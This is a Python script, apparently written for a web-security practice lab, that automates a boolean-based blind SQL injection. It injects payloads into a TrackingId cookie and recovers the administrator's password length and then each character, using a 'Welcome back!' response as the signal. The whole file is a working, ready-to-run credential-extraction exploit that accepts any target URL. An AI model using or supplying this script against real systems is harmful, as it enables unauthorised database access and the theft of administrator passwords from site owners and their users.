import requests
import string
import time

# 👉 Ask user to input target details
url = input("🔗 Enter target URL (include full path): ").strip()
base_tracking_id = input("🍪 Enter TrackingId value: ").strip()
session_id = input("🔐 Enter Session ID: ").strip()

# Character set: lowercase, digits, uppercase
characters = string.ascii_lowercase + string.digits + string.ascii_uppercase

def get_length():
    print("\n[*] Finding password length...")
    for i in range(1, 51):
        payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator'))={i}--"
        cookies = {
            'TrackingId': base_tracking_id + payload,
            'session': session_id
        }
        r = requests.get(url, cookies=cookies)
        print(f"Trying length: {i}")
        if 'Welcome back!' in r.text:
            print(f"[+] Password length found: {i}")
            return i
        time.sleep(0.3)
    print("[-] Length not found.")
    return 0

def get_password(length):
    print("[*] Extracting password...")
    password = ""
    for i in range(1, length + 1):
        for char in characters:
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}'--"
            cookies = {
                'TrackingId': base_tracking_id + payload,
                'session': session_id
            }
            r = requests.get(url, cookies=cookies)
            print(f"Trying position {i}: {char}", end="\r")
            if 'Welcome back!' in r.text:
                password += char
                print(f"[+] Found character {i}: {char}")
                break
            time.sleep(0.2)
    return password

length = get_length()
if length > 0:
    password = get_password(length)
    print(f"\n✅ Administrator Password: {password}")
else:
    print("✖️ Could not determine password length.")
